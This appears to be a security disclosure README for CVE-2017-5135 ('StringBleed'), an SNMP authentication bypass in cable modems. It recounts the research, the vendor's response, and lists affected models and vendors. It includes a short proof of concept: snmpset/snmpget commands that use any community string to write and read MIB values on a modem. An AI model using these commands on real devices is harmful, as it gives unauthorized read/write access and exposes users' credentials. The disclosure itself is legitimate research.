# StringBleed-CVE-2017-5135
Stringbleed  The CVE 2017-5135 SNMP authentication bypass, created and reserved for this issue, vulnerability type: Incorrect Access Control. 


# StringBleed PAPER ( CVE 2017-5135 )
Ezequiel Fernandez (Argentina)
Bertin Bervis (Costa Rica)
April 4th 2017

In DEFCON 24 IoT Village i gave a talk about the danger of SNMP write properties enabled devices in IoT, police patrols, ambulances and other in “critical mission vehicles” were affected in that research.

In December 2016 with a colleague from Argentina (Ezequiel Fernandez) we decided to “fuzz” again the SNMP protocol in the internet but this time using different combinations in the community string, for example what if we test which nodes from the internet using SNMP random values in the community string like “root” “admin” “user” will respond to our requests? In order to recap quickly the SNMP basics, we know there are 3 ways to authenticate the client and requests in the remote SNMP device, SNMP version 1 & 2 use a human-readable string datatype value called “community string” (usually public or private) in SNMP version 3 you have the option to use a user, password and authentication methods. Also, all information like oids ,traps and other stuff is stored in the management information base (MIB).

We wrote a simple python script from scratch using sockets in order to build the “snmpget” request, in the request we used the sysDescr OID , if the string value we are testing (admin,root etc etc) is the same stored in the SNMP agent for authentication , we are going to retrieve the sysDescr OID information successfully, is like a kind of “brute force”. After some days of scanning we noticed something weird, some devices/fingerprints were always responding no matter which value we used, so what’s going here???

As I mentioned before, the SNMP version 1 & 2 authentication should only accept the value stored in the SNMP agent authentication mechanism, but the behavior based in our results is not accurate like the statement explained previously.

In few words, we discovered the following: you can use any value string or integer in order to authenticate the SNMP agent successfully in some specific devices, but the worse thing here is : you have full read/write remote permissions using any string/integer value.

The CVE 2017-5135 Remote code execution in SNMP has been requested, created and reserved for this issue, vulnerability type: Incorrect Access Control.

zFollowing the right procedures we had to choose one specific model, so we decided to take the CISCO DPC3928SL which was one of the most affected one by the issue, CISCO said that the model is out of support and the company in charge is technicolor, so that was what we did, so let’s reach technicolor in order to clarify what´s going on here, after some email exchange technicolor recognized the issue, but at the end they provided a non-acceptable resolution.


As you can see, technicolor explains that the issue is a “control misconfiguration issue” by the ISP and not technicolor, wow! Great way to clean up your hands! But for us that was not enough, ok technicolor thanks for your help and fast response, but we are going to prove other thing here . so let´s start!

Now you have the idea about what the issue is, but probably you´re thinking .. well …are there more devices affected by the same issue in the internet??? The answer is yes, we can prove that other devices from different vendors/brands are also affected by the same behavior in SNMP, this proves also that the technicolor answer is wrong, completely wrong….

# We call it STRINGBLEED :-D

We decided to scan again but this generating not specific human-readable strings, we decided to generate a random hash value and send it to all SNMP devices in the internet and the results are shocking, at this point we have detected more than 150 unique fingerprints affected by stringbleed,

In order to have an idea, we are releasing the first 50 batch which demonstrate that technicolor answer is wrong, the issue is not ISP misconfiguration, the problem seems to be in the code.
Conclusions

    We discovered a full remote actions execution bypassing the control access in SNMP using any string/integer value
    You can write strings in the MIB
    You can retrieve easily password and other sensitive information without the need to guess the community string.
    The bug is difficult to solve since several vendors/brands are affected and the list growing everyday thanks to our scans
    Technicolor resolutions lacks of technical analysis and according our results is unacceptable

# PoC [Attack Vectors]: Community string

IP of theoric cablemodems vulnerable:"192.168.0.1"
 ```
[usr@pwn:~$] snmpset -v 1 -c "#Stringbleed" 192.168.0.1 1.3.6.1.2.1.1.6.0 s "test" 

iso.3.6.1.2.1.1.6.0 = STRING: "test"
 ```
  ```
[usr@pwn:~$] snmpget -v 1 -c "#Stringbleed" 192.168.0.1 iso.3.6.1.2.1.1.1.0 

iso.3.6.1.2.1.1.1.0 = STRING: "Cisco DPC3928SL DOCSIS 3.0 1-PORT Voice Gateway <<HW_REV: 1.0; VENDOR: Cisco; BOOTR: 2.4.0; SW_REV: D3928SL-P15-13-A386-c3420r55105-160127a; MODEL: DPC3928SL>>"
 ```
 
# Vulnerable 

* 5352
* BCW700J
* BCW710J
* BCW710J2
* C3000-100NAS
* CBV734EW
* CBV38Z4EC
* CBV38Z4ECNIT
* CBW383G4J
* CBW38G4J
* CBW700N
* CG2001-AN22A
* CG2001-UDBNA
* CG2001-UN2NA
* CG2002
* CG2200
* CGD24G-100NAS
* CGD24G-1CHNAS
* CM5100
* CM5100-511
* CM-6300n
* DCX-3200
* DDW2600
* DDW2602
* DG950A
* DPC2100
* DPC2320
* DPC2420
* DPC3928SL
* DVW2108
* DVW2110
* DVW2117
* DWG849
* DWG850-4
* DWG855
* EPC2203
* EPC3212
* IB-8120-W21
* IB-8120-W21E1
* MNG2120J
* MNG6200
* MNG6300
* SB5100
* SB5101
* SB5102
* SBG6580
* SBG900
* SBG901
* SBG941
* SVG1202
* SVG2501
* T60C926
* TC7110.AR
* TC7110.B
* TC7110.D
* TC7200.d1I
* TC7200.TH2v2
* THG540
* THG541
* Tj715x
* TM501A
* TM502B
* TM601A
* TM601B
* TM602A
* TM602B
* TM602G
* TWG850-4U
* TWG870
* TWG870U
* U10C019
* U10C037
* VM1700D
* WTM552G
* WTM652G
* DCM-704
* DCM-604
* DG950S

# Vendors:

* Ambit
* ArrisInteractive,L.L.C.
* Bnmux
* CastleNet
* Cisco
* Comtrend
* D-Link
* iNovoBroadband
* Kaonmedia
* MotorolaCorporation
* NET&SYS
* NETWAVENetworks,Inc.
* S-A
* Skyworth
* Technicolor
* TEKNOTEL
* Thomson
* Ubee
* ZoomTelephonics,Inc.

# TOOLS
[stringbleed suite](https://github.com/stringbleed/tools)

NO OFICIAL --> https://github.com/string-bleed/
